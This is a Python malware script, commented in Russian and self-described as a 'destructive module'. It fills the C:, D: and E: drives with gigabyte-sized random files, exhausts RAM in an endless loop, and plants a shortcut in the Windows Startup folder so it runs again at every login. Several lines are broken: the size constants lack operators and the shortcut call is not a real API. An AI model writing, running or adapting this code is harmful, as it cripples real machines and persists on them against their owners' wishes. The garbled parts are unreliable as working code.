import os
import ctypes
import psutil
import random
import string
import sys
import time
from threading import Thread
from ctypes import wintypes

# --- КОНФИГУРАЦИЯ ---
TARGET_DISKS = ['C:\\', 'D:\\', 'E:\\']  # Диски для заполнения
FILE_SIZE = 1024  1024  1024  # 1 ГБ на файл (рекомендуется уменьшить в тестах!)
NUM_FILES = 1000  # Количество файлов на диск
MEMORY_FILL_SIZE = 1024  1024  512  # 512 МБ для заполнения ОЗУ
AUTOSTART_PATH = r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# --- ФУНКЦИИ ---

def generate_random_filename(length=20):
    """Генерация случайного имени файла."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + ".tmp"

def fill_disk(disk_path):
    """Заполнение диска случайными файлами."""
    try:
        for i in range(NUM_FILES):
            filename = generate_random_filename()
            filepath = os.path.join(disk_path, filename)
            with open(filepath, 'wb') as f:
                f.write(os.urandom(FILE_SIZE))
            print(f"[+] Создан файл: {filepath}")
        print(f"[!] Диск {disk_path} заполнен.")
    except Exception as e:
        print(f"[-] Ошибка при заполнении диска {disk_path}: {e}")

def fill_memory():
    """Заполнение оперативной памяти."""
    try:
        data = bytearray(MEMORY_FILL_SIZE)
        while True:
            data.extend(data)  # Увеличиваем объем данных
            print(f"[+] Заполнение ОЗУ: {len(data) / (1024 * 1024)} МБ")
            time.sleep(1)
    except MemoryError:
        print("[!] ОЗУ заполнено.")
    except Exception as e:
        print(f"[-] Ошибка при заполнении ОЗУ: {e}")

def add_to_autostart():
    """Добавление скрипта в автозагрузку."""
    try:
        script_path = os.path.abspath(__file__)
        shortcut_path = os.path.join(AUTOSTART_PATH, "malicious_shortcut.lnk")

        # Создание ярлыка (Windows)
        shell = ctypes.windll.shell32
        shell.SHCreateShortcutW(
            wintypes.LPCWSTR(shortcut_path.encode('utf-16')),
            wintypes.LPCWSTR(script_path.encode('utf-16')),
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None
        )
        print(f"[+] Скрипт добавлен в автозагрузку: {shortcut_path}")
    except Exception as e:
        print(f"[-] Ошибка при добавлении в автозагрузку: {e}")

def main():
    """Основная функция."""
    print("[*] Запуск деструктивного модуля...")

    # Запуск потоков для параллельного выполнения
    threads = []

    for disk in TARGET_DISKS:
        if os.path.exists(disk):
            t = Thread(target=fill_disk, args=(disk,))
            threads.append(t)
            t.start()

    # Заполнение ОЗУ
    t_mem = Thread(target=fill_memory)
    threads.append(t_mem)
    t_mem.start()

    # Добавление в автозагрузку
    add_to_autostart()

    # Ожидание завершения потоков
    for t in threads:
        t.join()

    print("[!] Деструктивный модуль завершил работу.")

if __name__ == "__main__":
    main()